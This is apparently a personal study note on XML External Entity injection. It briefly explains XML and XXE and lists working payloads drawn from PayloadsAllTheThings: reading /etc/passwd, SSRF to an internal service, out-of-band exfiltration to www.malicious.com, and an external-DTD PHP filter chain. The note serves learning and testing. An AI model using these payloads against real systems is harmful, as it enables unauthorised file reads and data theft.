### XML External Entity Injection 

Resources used : https://portswigger.net/web-security/xxe

XML : It stands for eXtensible Markup Language and is a markup language kind of like HTML, but this was mainly designed to store and transport data , this was desinged to be self-descriptive. 

Due to how this is we have attacks such as XML external entity injection which can lead to an attacker to intefere with an application's processing of XML data , and lead to file read in most cases. 
In some case to escalate an XXE attacks to compromise the underlying server , and perform an SSRF attack from this.

We can use this to :
1. Retrieve Files 
2. Perform SSRF Attacks
3. Exfiltragte data of bound
4. Blind XXE to retrieve data via error messages

A great resource to learn from is this : https://www.youtube.com/watch?v=gjm6VHZa_8s&t

Some snippets of XXE payloads from Payloads all the things : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

```xml
# If its visible and is parsed 
<?xml version\="1.0"?><!DOCTYPE root \[<!ENTITY test SYSTEM 'file:///etc/passwd'\>\]><root\>&test;</root\>
# XML to SSRF 
<?xml version\="1.0" encoding\="ISO-8859-1"?>
<!DOCTYPE foo \[
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret\_pass.txt" >
\]>
<foo\>&xxe;</foo\>
# Out of Band XXE
<?xml version\="1.0" encoding\="ISO-8859-1"?>
<!DOCTYPE foo \[
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;"\>
\]
>
<foo\>&callhome;</foo\>

# External DTD , PHP Filter 
<?xml version\="1.0" ?>
<!DOCTYPE r \[
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml"\>
%sp;
%param1;
\]>
<r\>&exfil;</r\>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```